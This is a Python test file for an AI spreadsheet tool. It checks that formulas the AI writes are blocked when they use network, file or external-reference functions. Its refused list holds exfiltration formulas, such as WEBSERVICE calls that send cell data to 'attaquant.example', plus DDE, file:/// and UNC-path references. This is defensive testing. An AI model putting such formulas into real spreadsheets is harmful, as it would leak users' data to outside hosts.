"""Formules écrites par l'IA : seules les fonctions de calcul passent, sans
accès réseau, fichier ni référence externe."""

import pytest

from src.mirai.core import calc_functions
from src.mirai.core.context import ToolContext
from src.mirai.core.registry import ToolRegistry
from src.mirai.core.tools import register_all
from tests.stubs.fake_docs import FakeCalcDoc, FakeCalcSheet
from tests.stubs.fake_shell import FakeShell

REFUSED = [
    '=WEBSERVICE("http://attaquant.example/x?d="&A1)',
    "=WEBSERVICE(A1)",
    '=FILTERXML(A1;"//x")',
    "=INDIRECT(A1)",
    '=HYPERLINK(A1;"voir")',
    '=DDE("soffice";"x.ods";"A1")',
    "=COM.MICROSOFT.WEBSERVICE(A1)",
    "='[Classeur.xlsx]Feuille1'!A1",
    "='file:///etc/x.ods'#$Feuille1.A1",
    "='../x.ods'#$Feuille1.A1",
    '=CONCATENATE("HTTPS://attaquant.example/";A1)',
    '="\\\\serveur\\partage"&A1',
]

ALLOWED = [
    "=SUM(A1:A10)",
    "=IF(A1>0;A1;0)",
    "=A1*2",
    "=sum(A1:A3)",
    '=IFERROR(VLOOKUP(A2;D1:E9;2;0);"")',
]


def _set_formula(sheet, formula):
    doc = FakeCalcDoc(sheet)
    ctx = ToolContext(doc, doc.controller, "calc", FakeShell())
    return register_all(ToolRegistry()).call_tool(
        "calc_set_formula", {"ref": "C1", "formula": formula}, ctx)


@pytest.mark.parametrize("formula", REFUSED)
def test_set_formula_refuses_without_writing(formula):
    sheet = FakeCalcSheet()
    result = _set_formula(sheet, formula)
    assert not result.ok
    assert "refusée" in result.error
    assert sheet.formulas == {}


@pytest.mark.parametrize("formula", ALLOWED)
def test_set_formula_applies_calculation_functions(formula):
    sheet = FakeCalcSheet()
    result = _set_formula(sheet, formula)
    assert result.ok
    assert sheet.formulas[(2, 0)] == formula


def test_refusal_names_the_function():
    result = _set_formula(FakeCalcSheet(), "=SUM(A1)+WEBSERVICE(A1)")
    assert "WEBSERVICE" in result.error
    assert "SUM" not in result.error


def test_fill_down_does_not_copy_a_refused_formula():
    sheet = FakeCalcSheet(grid={(0, 1): "a", (0, 2): "b", (0, 3): "c"})
    sheet.formulas[(2, 1)] = "=WEBSERVICE(A2)"
    doc = FakeCalcDoc(sheet)
    ctx = ToolContext(doc, doc.controller, "calc", FakeShell())
    result = register_all(ToolRegistry()).call_tool(
        "calc_fill_formula_down", {"from_ref": "C2", "to_row": 5}, ctx)
    assert not result.ok
    assert "WEBSERVICE" in result.error
    assert list(sheet.formulas) == [(2, 1)]


def test_every_catalog_function_but_network_and_file_ones_is_allowed():
    names = calc_functions.catalog()
    assert len(names) > 100
    for name in names:
        refusal = calc_functions.formula_refusal(f"={name}(A1)")
        assert bool(refusal) == (name in calc_functions.NETWORK_OR_FILE_FUNCTIONS), name


def test_without_catalog_every_function_is_refused(monkeypatch):
    monkeypatch.setattr(calc_functions, "_catalog", {})
    assert not _set_formula(FakeCalcSheet(), "=SUM(A1:A3)").ok
    assert _set_formula(FakeCalcSheet(), "=A1*2").ok
